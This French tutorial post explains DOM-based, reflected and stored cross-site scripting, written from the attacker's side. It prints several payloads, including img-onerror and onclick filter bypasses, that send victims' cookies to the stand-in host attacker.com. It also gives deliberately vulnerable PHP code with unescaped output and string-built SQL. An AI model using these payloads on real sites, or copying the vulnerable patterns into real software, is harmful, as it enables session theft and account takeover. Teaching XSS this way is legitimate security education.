---
title: XSS, késako ?
authors:
    - Pierre-Ky-org
date: 2023-06-10
lang: fr
---

## Qu'est ce qu'une XSS ?

### Introduction
L'attaque par Cross-Site Scripting, communément appelée XSS, est une attaque qui est pratiquée sur des applications web. Elle est actuellement une attaque dévastatrice et à prendre au sérieux ([3ᵉ du top 10 OWASP](https://owasp.org/Top10/fr/)) 😱😱. Cette technique exploite les entrées utilisateurs qui ne sont pas désinfectées par le développeur. On va donc passer par des requêtes HTTP GET/POST pour injecter nos payloads et pouvoir toucher les autres utilisateurs.

Il existe trois variantes principales de cette attaque :

- le XSS basé sur le DOM
- le XSS réfléchi
- le XSS stocké

Pour savoir laquelle nous allons utiliser, il va falloir voir de quoi se compose le serveur web que nous attaquons. 

### XSS basé sur le DOM


La XSS basé sur le DOM est une attaque XSS non persistante qui s'exécute côté client. C'est-à-dire que notre objectif n'est pas de la maintenir dans une base de donnée du serveur et de la propager à tous les utilisateurs. Nous allons plutôt créer une URL qui sera exécuté par le code JS côté client :

```http://target.com/search?request=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>```

Voici notre URI, décortiquons là : 

Nous avons d'abord notre site cible : ```http://target.com/search```, on va chercher la page qui contient un formulaire ou qui nécessite un argument dans l'URL.

```?request=``` est l'argument dans lequel on va intégrer notre script JS.

```<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>```, ici on utilise [document.location](https://developer.mozilla.org/fr/docs/Web/API/Document/location) pour rediriger l'utilisateur vers ```http://attacker.com/steal.php``` qui sera notre site de réception de cookie, on ajoute l'argument ```cookie='+document.cookie``` pour rediriger les cookies de la victime vers notre site 😃

La différence avec une XSS réfléchi, c'est que le notre URL sera exécuté côté client et non par le serveur ! 

Par exemple, si côté client, vous avez un code qui récupère les arguments et les affiche dans le DOM :


```javascript
var url = document.location.href;
var message = url.split("message=")[1];
document.getElementById('welcomeMessage').innerText = message;
```

Alors, lorsque l'utilisateur visite cette URL (par phising la plupart du temps), le code JS extrait le message à partir de l'URL et l'injecte directement dans la page, ce qui conduit à l'exécution du code.


### XSS réfléchi

L'attaque XSS réfléchi vient du fait que l'attaque est basée sur la réponse du serveur à une requête, elle rentre en opposition avec la XSS basé sur le DOM qui exécute le code coté client.
Cette variante est aussi non persistante et sera aussi exploiter par le phising 

Reprenons notre payload : 

```http://target.com/search?request=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>```

Si le serveur a un script php de ce style qui extrait et affiche la requête : 



```php
<?php
$request = $_GET['request'];
?>
<html>
    <body>
        <form method="GET" action="">
            <input type="text" name="request" placeholder="Enter search request" />
            <input type="submit" value="Search" />
        </form>
        <?php
        if ($request) {
            echo "You searched for: " . $request;
        }
        ?>
    </body>
</html>
```

Alors le serveur renverra une page avec notre code qui sera inséré dedans.


### XSS stocké

Pour la XSS stocké, considérons un site web avec un forum de discussion où les utilisateurs peuvent poster des commentaires. Si le site ne vérifie pas correctement le contenu des messages, un attaquant pourrait poster un commentaire contenant du code JS, comme notre fameux payload ```<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>```. Ce commentaire serait alors stocké sur la base de donnée du site et chaque fois qu'un autre utilisateur affichera ce commentaire sur son navigateur, le code malveillant serait exécuté. 
Voici un exemple de script php qui stocke les inputs que les utilisateurs envoient : 

```php
<?php
$db = new SQLite3('comments.db');
$db->exec("CREATE TABLE IF NOT EXISTS comments (comment TEXT)");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $db->exec("INSERT INTO comments (comment) VALUES ('$comment')");
}
?>

<!DOCTYPE html>
<html>
<body>
<form method="post" action="">
    <textarea name="comment"></textarea>
    <input type="submit" value="Submit comment">
</form>

<?php
$results = $db->query('SELECT * FROM comments');
while ($row = $results->fetchArray()) {
    echo $row['comment'] . '<br />';
}
?>

</body>
</html>
```

Ici la première partie du code PHP intègre le commentaire à la base de données. Puis la seconde partie affiche tout les commentaires.
Comme pour les autres variantes, dès qu'un utilisateur affichera la page, le code malveillant sera exécuté.

### Payloads exotiques

Souvent des normes de sécurités sont mises en place pour supprimer les balises script, il faut donc ruser pour pouvoir injecter notre payload.
Par exemple celui-ci : 

```<img src/onerror=document.location='http://attacker.com/steal.php?cookie='+document.cookie;>```

Ce payload ajoute une balise image au DOM qui n'a pas de source ce qui appellera onerror et lancera notre script.

Ou encore ce payload : 

```<a onclick="document.location='http://attacker.com/steal.php?cookie='+document.cookie;" style=display:block>test</a>```

Ici, on ajoute un lien avec la balise ```a``` qui utilise ```onclick``` pour activer le script.
Ce payload demande que la victime interagisse plus et sera moins efficace.

Beaucoup de payload existe et je vous recommande [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) pour explorer un peu les possibilités 😁



